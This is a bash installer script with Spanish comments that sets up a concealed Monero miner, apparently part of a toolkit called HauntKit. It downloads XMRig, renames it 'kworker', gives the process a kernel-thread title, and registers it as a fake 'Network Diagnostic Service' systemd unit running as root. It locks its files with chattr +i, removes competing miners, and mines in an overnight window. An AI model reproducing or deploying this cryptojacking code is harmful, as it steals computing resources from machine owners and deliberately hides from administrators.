#!/bin/bash
# ════════════════════════════════════════════════════════
#  netdiag — Instalador
#  Uso:  sudo bash mine-install.sh         (1ra vez)
#        sudo bash mine-install.sh --update (actualizar)
# ════════════════════════════════════════════════════════

# ─── Colores ───
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[1;33m'; NC='\033[0m'

UPDATE_MODE=false
[ "$1" = "--update" ] && UPDATE_MODE=true

# ─── Solo root ───
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Debes ejecutar como root (sudo)$NC"
    exit 1
fi

# ─── Buscar y eliminar mineros rivales (solo en instalación, no en update) ───
if ! $UPDATE_MODE; then
    CLEANER="$(cd "$(dirname "$0")" && pwd)/clean-miners.sh"
    if [ -f "$CLEANER" ]; then
        echo -e "${YELLOW}[*] Buscando mineros rivales antes de instalar...${NC}"
        bash "$CLEANER" --strict 2>&1
        echo ""
    fi
fi

# ─── Rutas fijas del sistema (bajo perfil) ───
REPO_DIR="/opt/netdiag/lib"
INSTALL_DIR="/opt/netdiag"
DATA_DIR="$INSTALL_DIR/data"
CONFIG_DST="$INSTALL_DIR/.env"
XMRIG_BIN="$DATA_DIR/kworker"
XMRIG_CONFIG="$DATA_DIR/config.json"
VERSION_DST="$INSTALL_DIR/.version"
SERVICE_NAME="netdiag"

if $UPDATE_MODE; then
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          Actualizando netdiag           ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
else
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║        Instalador de netdiag            ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
fi

# ─── Asegurar repo ───
if [ -d "$REPO_DIR/.git" ]; then
    echo -e "${GREEN}[✓] Repo encontrado en $REPO_DIR${NC}"
elif [ -f "$(dirname "$0")/../../VERSION" ]; then
    SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
    HAUNTKIT_SRC="$(cd "$SCRIPT_DIR/../.." && pwd)"
    echo -e "${YELLOW}[*] Copiando repo desde $HAUNTKIT_SRC...${NC}"
    mkdir -p "$(dirname "$REPO_DIR")"
    rm -rf "$REPO_DIR" 2>/dev/null
    cp -a "$HAUNTKIT_SRC" "$REPO_DIR"
    echo -e "${GREEN}[✓] Repo copiado a $REPO_DIR${NC}"
else
    echo -e "${YELLOW}[*] Clonando repo desde GitHub...${NC}"
    mkdir -p "$(dirname "$REPO_DIR")"
    git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" 2>&1 | tail -1
    echo -e "${GREEN}[✓] Repo clonado en $REPO_DIR${NC}"
fi

# ─── Config: NO sobrescribir si existe ───
if ! $UPDATE_MODE; then
    CONFIG_SRC="$REPO_DIR/tools/utils/mine-config.env"
    CONFIG_EXAMPLE="$REPO_DIR/tools/utils/mine-config.env.example"

    if [ ! -f "$CONFIG_SRC" ]; then
        [ -f "$CONFIG_EXAMPLE" ] && CONFIG_SRC="$CONFIG_EXAMPLE"
    fi

    if [ -f "$CONFIG_SRC" ]; then
        if [ ! -f "$CONFIG_DST" ]; then
            cp "$CONFIG_SRC" "$CONFIG_DST"
            chmod 600 "$CONFIG_DST"
            chown root:root "$CONFIG_DST"
            echo -e "${GREEN}[✓] Config instalada en $CONFIG_DST${NC}"
        else
            echo -e "${YELLOW}[*] Config existente preservada${NC}"
        fi
    fi
else
    echo -e "${YELLOW}[*] Modo update: config no modificada${NC}"
fi

# ─── Directorios ───
echo -e "\n${CYAN}[*] Preparando directorios...${NC}"
mkdir -p "$DATA_DIR" "$INSTALL_DIR"
chmod 755 "$INSTALL_DIR"

# ─── Copiar service script ───
cp "$REPO_DIR/tools/utils/mine-service.sh" "$INSTALL_DIR/mine-service.sh"
chmod 755 "$INSTALL_DIR/mine-service.sh"
chown root:root "$INSTALL_DIR/mine-service.sh"
echo -e "${GREEN}[✓] Service script copiado${NC}"

# ─── Copiar monitor ───
cp "$REPO_DIR/tools/utils/mine-monitor.sh" "$INSTALL_DIR/mine-monitor.sh"
chmod 755 "$INSTALL_DIR/mine-monitor.sh"
echo -e "${GREEN}[✓] Monitor copiado${NC}"

# ─── Copiar VERSION ───
cp "$REPO_DIR/VERSION" "$VERSION_DST"
VERSION=$(cat "$REPO_DIR/VERSION")
echo -e "${GREEN}[✓] Versión: $VERSION${NC}"

# ─── Obtener última versión de XMRig ───
LATEST=$(curl -sL https://api.github.com/repos/xmrig/xmrig/releases/latest \
    | grep -oP '"tag_name": "\K[^"]+')
[ -z "$LATEST" ] && LATEST="v6.22.2"
XMRIG_VERSION="${LATEST#v}"

# ════════════════════════════════════════════════════════
#  DETECCIÓN DE GPU
# ════════════════════════════════════════════════════════
GPU_VENDOR=""
GPU_RECOMMENDED=false
GPU_SCRIPT="$REPO_DIR/tools/utils/detect-gpu.sh"

if [ -f "$GPU_SCRIPT" ]; then
    echo -e "\n${CYAN}[*] Detectando hardware gráfico...${NC}"
    # Obtener JSON con detección
    GPU_JSON=$(bash "$GPU_SCRIPT" --json 2>/dev/null || echo '{"gpu_found":false}')
    GPU_FOUND=$(echo "$GPU_JSON" | grep -oP '"gpu_found": \K(true|false)')
    GPU_RECOMMENDED=$(echo "$GPU_JSON" | grep -oP '"gpu_recommended": \K(true|false)')
    GPU_VENDOR=$(echo "$GPU_JSON" | grep -oP '"gpu_vendor": "\K[^"]+')
    GPU_MODEL=$(echo "$GPU_JSON" | grep -oP '"gpu_model": "\K[^"]+')
    GPU_SCORE=$(echo "$GPU_JSON" | grep -oP '"gpu_score": \K\d+')

    if [ "$GPU_FOUND" = "true" ]; then
        echo -e "  ${GREEN}✓ GPU: $GPU_MODEL${NC}"
        if [ "$GPU_RECOMMENDED" = "true" ]; then
            echo -e "  ${GREEN}✓ Score: $GPU_SCORE — RECOMENDADA para minería${NC}"
        else
            echo -e "  ${YELLOW}⚠ Score: $GPU_SCORE — GPU lenta, solo CPU${NC}"
            GPU_VENDOR=""
        fi
    else
        echo -e "  ${YELLOW}→ Sin GPU detectable, modo CPU${NC}"
    fi
fi

# ════════════════════════════════════════════════════════
#  DESCARGA DE XMRig (variante según GPU)
# ════════════════════════════════════════════════════════

# Función: descargar y extraer XMRig
download_xmrig() {
    local variant="$1"       # vacio, -cuda, -opencl
    local output_name="$2"   # nombre del binario destino
    local url

    if [ -z "$variant" ]; then
        url="https://github.com/xmrig/xmrig/releases/download/$LATEST/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
    else
        url="https://github.com/xmrig/xmrig/releases/download/$LATEST/xmrig-${XMRIG_VERSION}-linux-static-x64${variant}.tar.gz"
    fi

    echo -e "  ${YELLOW}→ Descargando$variant...${NC}"
    cd /tmp
    wget -q "$url" -O xmrig-dl.tar.gz 2>/dev/null || return 1

    local tar_dir
    tar_dir=$(tar tzf xmrig-dl.tar.gz | head -1 | cut -d/ -f1)
    tar xf xmrig-dl.tar.gz 2>/dev/null || return 1

    if [ -f "$tar_dir/xmrig" ]; then
        cp "$tar_dir/xmrig" "$output_name"
        chmod 755 "$output_name"
        echo -e "  ${GREEN}✓ Binario: $output_name${NC}"

        # Copiar librerías GPU si existen (CUDA/OpenCL .so)
        for lib in "$tar_dir"/libxmrig-*.so; do
            if [ -f "$lib" ]; then
                cp "$lib" "$DATA_DIR/"
                chmod 644 "$DATA_DIR/$(basename "$lib")"
                echo -e "  ${GREEN}✓ Librería: $(basename "$lib")${NC}"
            fi
        done

        rm -rf "$tar_dir" xmrig-dl.tar.gz
        return 0
    fi

    rm -rf "$tar_dir" xmrig-dl.tar.gz 2>/dev/null
    return 1
}

# Descargar binario según GPU detectada
GPU_DOWNLOADED=false

if [ "$GPU_RECOMMENDED" = "true" ]; then
    case "$GPU_VENDOR" in
        nvidia)
            echo -e "\n${CYAN}[*] GPU NVIDIA detectada — descargando XMRig+CUDA${NC}"
            if download_xmrig "-cuda" "$XMRIG_BIN"; then
                echo "$GPU_VENDOR" > "$DATA_DIR/.gpu-vendor"
                echo "$GPU_MODEL" > "$DATA_DIR/.gpu-model"
                GPU_DOWNLOADED=true
            fi
            ;;
        amd)
            echo -e "\n${CYAN}[*] GPU AMD detectada — descargando XMRig+OpenCL${NC}"
            if download_xmrig "-opencl" "$XMRIG_BIN"; then
                echo "$GPU_VENDOR" > "$DATA_DIR/.gpu-vendor"
                echo "$GPU_MODEL" > "$DATA_DIR/.gpu-model"
                GPU_DOWNLOADED=true
            fi
            ;;
    esac
fi

# Fallback: descargar CPU-only si no se descargó variante GPU
if ! $GPU_DOWNLOADED; then
    echo -e "\n${CYAN}[*] Descargando XMRig (CPU-only)...${NC}"
    if [ -f "$XMRIG_BIN" ]; then
        echo -e "${GREEN}[✓] Binario ya existe, saltando descarga${NC}"
    else
        if download_xmrig "" "$XMRIG_BIN"; then
            echo -e "${GREEN}[✓] Binario CPU instalado${NC}"
        fi
    fi
    # Asegurar que no hay flag GPU residual
    rm -f "$DATA_DIR/.gpu-vendor" "$DATA_DIR/.gpu-model" 2>/dev/null
fi

# ─── Verificar binario ───
if [ ! -f "$XMRIG_BIN" ]; then
    echo -e "${YELLOW}[!] Binario no encontrado. Copia el binario manualmente.${NC}"
fi

# ─── Generar config.json de XMRig (template) ───
echo -e "\n${CYAN}[*] Generando configuración de XMRig...${NC}"

if [ -f "$CONFIG_DST" ]; then
    source "$CONFIG_DST"
fi

# Valores por defecto
START_HOUR="${START_HOUR:-18}"
END_HOUR="${END_HOUR:-7}"
MAX_CPU="${MAX_CPU:-80}"
THREADS="${THREADS:-0}"
POOL_URL="${POOL_URL:-gulf.moneroocean.stream:10128}"
WALLET_BASE="${WALLET_BASE:-SET_YOUR_WALLET}"

# Construir sección GPU del JSON
GPU_JSON=""
GPU_PART=""
if [ "$GPU_RECOMMENDED" = "true" ] && [ -f "$DATA_DIR/.gpu-vendor" ]; then
    local_vendor=$(cat "$DATA_DIR/.gpu-vendor")
    case "$local_vendor" in
        nvidia)
            GPU_PART=$'    "cuda": {\n        "enabled": true\n    },'
            GPU_JSON="cuda"
            ;;
        amd)
            GPU_PART=$'    "opencl": {\n        "enabled": true\n    },'
            GPU_JSON="opencl"
            ;;
    esac
fi

# Escribir config.json template
cat > "$XMRIG_CONFIG" << TEMPLATE
{
    "autosave": true,
    "donate-level": 0,
    "title": "kworker/0:0",
    "cpu": {
        "enabled": true,
        "max-threads-hint": $MAX_CPU
    },
    $(echo "$GPU_PART" | sed 's/,$//')
    "pools": [
        {
            "url": "$POOL_URL",
            "user": "__WALLET_PLACEHOLDER__",
            "pass": "__WORKER_NAME__",
            "algo": "auto",
            "keepalive": true
        }
    ]
}
TEMPLATE

# Si el JSON quedó mal formado por GPU_PART vacío, arreglar
if [ -z "$GPU_PART" ]; then
    # El template de arriba tiene la coma extra de GPU, re-generar sin ella
    cat > "$XMRIG_CONFIG" << TEMPLATE
{
    "autosave": true,
    "donate-level": 0,
    "title": "kworker/0:0",
    "cpu": {
        "enabled": true,
        "max-threads-hint": $MAX_CPU
    },
    "pools": [
        {
            "url": "$POOL_URL",
            "user": "__WALLET_PLACEHOLDER__",
            "pass": "__WORKER_NAME__",
            "algo": "auto",
            "keepalive": true
        }
    ]
}
TEMPLATE
fi

chmod 600 "$XMRIG_CONFIG"
echo -e "${GREEN}[✓] Config template generado${NC}"
if [ -n "$GPU_JSON" ]; then
    echo -e "${GREEN}[✓] GPU habilitada en config: $GPU_JSON${NC}"
fi

# ─── Crear/actualizar servicio systemd ───
echo -e "\n${CYAN}[*] Configurando servicio systemd...${NC}"

cat > /etc/systemd/system/$SERVICE_NAME.service << 'EOF'
[Unit]
Description=Network Diagnostic Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/netdiag/mine-service.sh
Restart=on-failure
RestartSec=30
User=root
Nice=10
IOSchedulingClass=best-effort
IOSchedulingPriority=7

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 2>/dev/null
systemctl enable $SERVICE_NAME 2>/dev/null

echo -e "${GREEN}[✓] Servicio: $SERVICE_NAME${NC}"

# ─── Proteger archivos ───
echo -e "\n${CYAN}[*] Protegiendo archivos...${NC}"

if [ -f "$XMRIG_BIN" ]; then
    chattr +i "$XMRIG_BIN" 2>/dev/null && \
        echo -e "${GREEN}[✓] Binario inmutable${NC}" || \
        echo -e "${YELLOW}[!] Binario sin protección extra${NC}"
fi

if [ -f "$XMRIG_CONFIG" ]; then
    chattr +i "$XMRIG_CONFIG" 2>/dev/null && \
        echo -e "${GREEN}[✓] Config protegido${NC}"
fi

chattr +i "$INSTALL_DIR/mine-service.sh" 2>/dev/null && \
    echo -e "${GREEN}[✓] Script protegido${NC}"

if [ -f "$CONFIG_DST" ]; then
    chmod 600 "$CONFIG_DST"
    chown root:root "$CONFIG_DST"
    echo -e "${GREEN}[✓] .env: solo root${NC}"
fi

# ─── Auto-update ───
echo -e "\n${GREEN}[✓] Auto-update activo (cada ~6h)${NC}"

# ─── Migrar desde versión anterior si existe ───
if [ -f "/opt/hauntkit/mine-config.env" ] && [ ! -f "$CONFIG_DST" ]; then
    echo -e "${YELLOW}[*] Migrando config desde /opt/hauntkit/...${NC}"
    cp "/opt/hauntkit/mine-config.env" "$CONFIG_DST"
    chmod 600 "$CONFIG_DST"
    chown root:root "$CONFIG_DST"
    systemctl disable sys-scheduler 2>/dev/null
    systemctl stop sys-scheduler 2>/dev/null
    rm -f /etc/systemd/system/sys-scheduler.service
    systemctl daemon-reload 2>/dev/null
    echo -e "${GREEN}[✓] Migración completada${NC}"
fi

# ─── Resumen ───
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
if $UPDATE_MODE; then
    echo -e "${CYAN}║          Actualización lista            ║${NC}"
else
    echo -e "${CYAN}║         Instalación completada          ║${NC}"
fi
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo "  Versión:     $VERSION"
echo "  Servicio:    $SERVICE_NAME"
echo "  Binario:     $XMRIG_BIN"
echo "  Config:      $CONFIG_DST (oculto)"
echo "  XMRig cfg:   $XMRIG_CONFIG"
echo "  Repo:        $REPO_DIR (lib/)"
echo ""

if [ -f "$DATA_DIR/.gpu-vendor" ]; then
    echo "  GPU detectada: $(cat "$DATA_DIR/.gpu-model" 2>/dev/null || echo 'desconocida')"
    echo "  Modo:         CPU + GPU"
    echo ""
fi

echo "  Comandos:"
echo "    Iniciar:   systemctl start $SERVICE_NAME"
echo "    Detener:   systemctl stop $SERVICE_NAME"
echo "    Estado:    systemctl status $SERVICE_NAME"
echo "    Monitorear: systemctl status $SERVICE_NAME"
echo ""

if ! $UPDATE_MODE; then
    # ─── Iniciar servicio (controla el horario de minado internamente) ───
    # El servicio corre siempre como daemon; el worker se activa solo en la ventana
    # Cargar config para conocer la ventana de minado
    START_HOUR="${START_HOUR:-18}"
    END_HOUR="${END_HOUR:-7}"
    if [ -f "$CONFIG_DST" ]; then
        . "$CONFIG_DST" 2>/dev/null
        START_HOUR="${START_HOUR:-18}"
        END_HOUR="${END_HOUR:-7}"
    fi

    CUR_HOUR=$(TZ="America/Bogota" date +%-H 2>/dev/null || date +%-H)

    # ¿Estamos dentro de la ventana de minado?
    IN_WINDOW=false
    if [ "$CUR_HOUR" -ge "$START_HOUR" ] || [ "$CUR_HOUR" -lt "$END_HOUR" ]; then
        IN_WINDOW=true
    fi

    systemctl enable $SERVICE_NAME >/dev/null 2>&1
    systemctl start $SERVICE_NAME 2>/dev/null

    if $IN_WINDOW; then
        echo -e "${GREEN}[✓] En horario de minado (${CUR_HOUR}:00) — worker iniciado de inmediato${NC}"
    else
        echo -e "${YELLOW}[*] Fuera de horario (${CUR_HOUR}:00) — servicio activo, minará ${START_HOUR}:00-${END_HOUR}:00${NC}"
    fi
fi

echo ""
echo -e "${GREEN}¡Listo, CYBER HAUNT!${NC} 🔥👻"
